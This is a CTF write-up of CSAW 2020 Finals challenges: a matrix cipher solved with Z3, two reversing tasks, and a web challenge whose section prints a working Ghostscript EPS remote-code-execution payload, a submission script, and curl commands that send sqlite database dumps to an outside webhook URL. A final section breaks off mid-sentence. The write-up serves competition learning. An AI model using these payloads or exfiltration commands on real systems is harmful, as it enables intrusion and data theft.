---
ctf: csaw
year: 2020
---

# CSAW Finals

## Crypto

### The Matrix

I'll preface this challenge by saying that I suck at linear algebra and whenever I see a matrix, I reach out for Z3.

In this challenge the cipher text is encrypted using a matrix:

```python
ecm = M(3, 3)
# i seem to have lost some ...
ecm.populate([3, 6, ?,
              ?, 4, 2,
              1, 5, 7])
e = Enc(ecm, "sample text")
print(e.encrypt())
```

The text is split in blocks of 3 characters and then multiplied as such:

$$
\begin{bmatrix}
3 & 6 & x \\
y & 4 & 2 \\
1 & 5 & 7 \\
\end{bmatrix}
\times
\begin{bmatrix}
c_1 \\
c_2 \\
c_3 \\
\end{bmatrix}
=
\begin{bmatrix}
e_1 \\
e_2 \\
e_3 \\
\end{bmatrix}
$$

If we find $M^{-1}$ we could reverse the encryption,
or let Z3 do the hard work for us.

We know that $x$ and $y$ are fixed for every message,
since the encrypted text is padded,
we can just iterate the message in blocks of 3 and add constraints that make the output equal to the respective element calculation.
From the previous example:

$$
e_1 = 3 \times c_1 + 6 \times c_2 + x \times c_3
$$

Putting it all together we get:

```python
#!/usr/bin/env python3
from z3 import *

with open("messages.txt", "r") as msgs:
    for l in msgs.readlines():
        message = eval(l)

        solver = Solver()
        x, y = Ints("x y")
        for idx in range(0, len(message), 3):
            c1, c2, c3 = Ints(f"c_{idx}1 c_{idx}2 c_{idx}3")
            solver.add(
                And(
                    c1 >= -1, c2 >= -1, c3 >= -1, c1 <= 26, c2 <= 26, c3 <= 26,
                    message[idx+0] == (c1 * 3 + c2 * 6 + c3 * x),
                    message[idx+1] == (c1 * y + c2 * 4 + c3 * 2),
                    message[idx+2] == (c1 * 1 + c2 * 5 + c3 * 7),
                )
            )

        solver.check()
        model = solver.model()
        print(model)
```

The output is awful as I do not know how to extract values from Z3 models:
```
[c_63 = -1,
 c_62 = -1,
 c_61 = 5,
 c_33 = 19,
 c_32 = 18,
 c_31 = 15,
 y = 9,
 x = 1,
 c_03 = 4,
 c_02 = 14,
 c_01 = 5]
```

Which I then filtered to `[-1, -1, 5, 19, 18, 15, 4, 14, 5]`,
the final script just takes all these arrays, reverses them and turns them into the respective string,
finally it sends the messages to the server.

```
flag{c4nt_u_t3ll_th4t_1m_t4k1ng_l1n3ar_alg3br4}
```

## Reverse

### Rap

Loading the binary in Cutter we get the following `main` disassembly:

```c++
undefined4 main(void)
{
    int32_t iVar1;
    undefined8 uVar2;
    int64_t var_50h;
    int64_t var_40h;
    int64_t var_28h;
    int64_t var_4h;

    var_4h._0_4_ = 0;
    fcn.00400cc0();
    std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string()(&var_28h);
    uVar2 =
            std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                      (reloc.std::cout, "help me");
    std::ostream::operator<<(std::ostream& (*)(std::ostream&))
              (uVar2,
               std::basic_ostream<char, std::char_traits<char> >& std::endl<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&)
              );

    std::basic_istream<char, std::char_traits<char> >& std::operator>><char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&)
              (reloc.std::cin, &var_28h);
    iVar1 = fcn.00400ce0((int64_t)&var_28h);
    if (iVar1 != 0) {
        uVar2 =
                std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)
                          (reloc.std::cout, "you found me!");
        std::ostream::operator<<(std::ostream& (*)(std::ostream&))
                  (uVar2,
                   std::basic_ostream<char, std::char_traits<char> >& std::endl<char, std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&)
                  );
    }
    var_4h._0_4_ = 0;
    std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()(&var_28h);
    return (undefined4)var_4h;
}
```

It is a lot to take in, but due to:
```cpp
std::basic_istream<char, std::char_traits<char> >& std::operator>><char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&)
              (reloc.std::cin, &var_28h);
```

We know that `var_28h` is the user input, so we follow `fcn.00400ce0`,
which has a suspicious `memcpy(&s1, "f", 0xac, &s1);`,
in fact, if we follow `"f"` (which in Ghidra is `&DAT_00400f50`) we get to a data block:

```
        00400f50 66              ??         66h    f
        00400f51 00              ??         00h
        00400f52 00              ??         00h
        00400f53 00              ??         00h
        00400f54 6e              ??         6Eh    n
        00400f55 00              ??         00h
        00400f56 00              ??         00h
        00400f57 00              ??         00h
        00400f58 65              ??         65h    e
        00400f59 00              ??         00h
        00400f5a 00              ??         00h
        00400f5b 00              ??         00h
        00400f5c 67              ??         67h    g
        00400f5d 00              ??         00h
        00400f5e 00              ??         00h
        00400f5f 00              ??         00h
        <REDACTED FOR BREVITY>
```

Further along in the code, the input message is being transformed and compared to our array:

```cpp
var_c8h = 0;
while( true ) {
    uVar1 = std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::length() const(var_8h);
    if (uVar1 <= (uint64_t)(int64_t)(int32_t)var_c8h) break;
    pcVar2 = (char *)
                std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator[](unsigned long) const
                        (var_8h, (int64_t)(int32_t)var_c8h);
    if ((var_c8h ^ (int32_t)*pcVar2) + var_c8h != *(int32_t *)((int64_t)&s1 + (int64_t)(int32_t)var_c8h * 4)) {
        var_c4h = 0;
    }
    var_c8h = var_c8h + 1;
}
```

We see that `var_c8h` is an index and it is being XORd with the input value,
and since $(A \oplus B) \oplus C = A \oplus (B \oplus C)$ we can just XOR the array we retrieved with the index to get the flag:

```python
arr = [
    0x66,0x6e,0x65,0x67,0x83,0x72,0x3b,0x72,
    0x80,0x5f,0x45,0x71,0x5f,0x86,0x8a,0x4a,
    0x70,0x72,0x33,0x8a,0x5f,0x39,0x8e,0x5f,
    0x82,0x46,0x84,0x86,0x4b,0x96,0x5f,0x4d,
    0x6e,0x9f,0x38,0x3a,0x34,0x36,0x38,0x3a,
    0x44,0x46,0x81
]
for idx, v in enumerate(arr):
    print(chr((v - idx) ^ idx), end ="")
# flag{h3lp_1m_tr4pp3d_1n_r4pp3d_1n_44444444}
```
### Sourcery

The `.zip` contains a `.git` folder, we can jump into the terminal and run `git branch -a`, giving us two branches:

```
master
enhancements
```

The `git log` for `master` is not very exciting, however the `enhancements` has the following:

```
commit a75467425e23101ce32ba809dfd7c3894925abc5
Author: Ellian Moosk <ellian.moosk@skynet-cars.org>
Date:   Sun Oct 18 19:25:57 2020 -0400

    Fix whoops

commit 87f8640fffc5cdbad24ea71dec92eee737448490
Author: Ellian Moosk <ellian.moosk@skynet-cars.org>
Date:   Sun Oct 18 19:24:43 2020 -0400

    More work
```

If we `git diff` the branch previous to the whoops, we see:

```
diff --git a/__pycache__/secret.cpython-38.pyc b/__pycache__/secret.cpython-38.pyc
deleted file mode 100644
```

If we checkout that commit we get the `.pyc` file.
To decompile it I used [uncompyle6](https://github.com/rocky/python-uncompyle6) which resulted in:

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.6 (default, Sep 25 2020, 09:36:53)
# [GCC 10.2.0]
# Embedded file name: /home/nemesis/Code/osiris/CSAW-CTF-2020-Finals/rev/sourcery/sourcery-repo/secret.py
# Compiled at: 2020-10-15 19:51:13
# Size of source mod 2**32: 1098 bytes
"""
secrets.py

    Stuff you shouldn't be seeing >:(
"""
import os
SECRET_KEY = os.urandom(32)

def gen_secret(idx):
    """ TODO: still a work-in-progress """
    seed = [(1, 'm'), (25, 'X'), (37, '3'),
        (30, 'R'), (38, '0'), (35, 'u'),
        (34, 'B'), (8, 'd'), (15, '0'),
        (27, 'f'), (4, 'Z'), (13, 'G'),
        (2, 'x'), (32, 'Z'), (10, 'Z'),
        (19, 'y'), (26, 'R'), (21, 'l'),
        (7, 'j'), (9, 'G'), (16, 'e'),
        (31, 'f'), (20, 'e'), (12, 'c'),
        (39, '='), (33, 'D'), (28, 'M'),
        (0, 'Z'), (6, 't'), (18, 'N'),
        (3, 'h'), (36, 'M'), (24, 'M'),
        (11, 'f'), (23, 'n'), (17, 'T'),
        (14, 'w'), (29, 'X'), (22, '9'),
        (5, '3')]
# okay decompiling __pycache__/secret.cpython-38.pyc
```

If we sort the seed and extract the letters we get a base64 string which when decoded gives us the flag:
```python
seed.sort()
"".join(map(lambda t: t[1], seed))
base64.b64decode("".join(map(lambda t: t[1], seed)))
# flag{ctf_pl4y3rz_g1t_1t_d0n3}
```

## Web

### Picgram

I searched for the Dockerfile origin `FROM vulhub/ghostscript:9.23-python` which got me fairly quickly to
<https://github.com/vulhub/vulhub/commit/dd5b071c60d9c0e1f6943cd7c49c14f23468a962>.

There we read:

> #### Exploit
> You can upload rce.jpg (a specially-crafted EPS image, not a real JPG) to execute `touch /tmp/got_rce` in the server. For proof, you can execute `docker exec [CONTAINER_ID] ls -alt /tmp`. To get `CONTAINER_ID`, you can check with `docker container ls`. To change the shell execution to other commands, you can change `touch /tmp/got_rce` directly in the `rce.jpg`.

Which means we get easy RCE with the following:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%<command goes here>) currentdevice putdeviceprops
```

Since we have RCE and `sqlite3` at hand we just need to exfiltrate the information,
this part took the longest because I didn't realize straight away the output would be cut in whitespace.
I am also pretty sure I could reverse shell the challenge since we had a VPN but oh well...

I wrote a submission script:

```python
#!/usr/bin/env python3

import requests

url = "http://web.chal.csaw.io:5000/"
headers = {
    "Host": "web.chal.csaw.io:5000",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

while True:
    cmd = input("> ")
    f = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%{}) currentdevice putdeviceprops
    """.format(cmd)
resp = requests.post(url, headers=headers, files={"image": ("exploit.jpg", f)})
print(resp.status_code)
```

After running the command:

```
curl https://webhook.site/15a28193-cf70-44b8-b993-d72f0c5bb844 -d $(sqlite3 /home/picgram/flag.db '.tables' | tr -s ' ' ':' | tr -s '\n' '-' | tr -s '\t' ':')
```

We find a single table - `projects`.
Now we dump the table, and then filter it with `tr`, reversing the "concatenation".

```
curl https://webhook.site/15a28193-cf70-44b8-b993-d72f0c5bb844 -d $(sqlite3 /home/picgram/flag.db 'select * from projects' | tr -s ' ' ':' | tr -s '\n' '-' | tr -s '\t' ':')
```

Searching through the dump we find the flag:

```
77|iS thIs ThE flAg??|b'flag{th4t_w4s_s0m3_sp00ky_scr1pt1ng}\n'
```

### Shark Facts

The challenge would create a repository

---

Files for these challenges can be found in [here](https://github.com/jmg-duarte/ctfs/tree/master/assets/challenges/2020/csaw-final)

<!-- <script>
  MathJax = {
    loader: { load: ["[tex]/ams"] },
    tex: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"],
      ],
      packages: { "[+]": ["ams"] },
    },
  };
</script>
<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
></script> -->
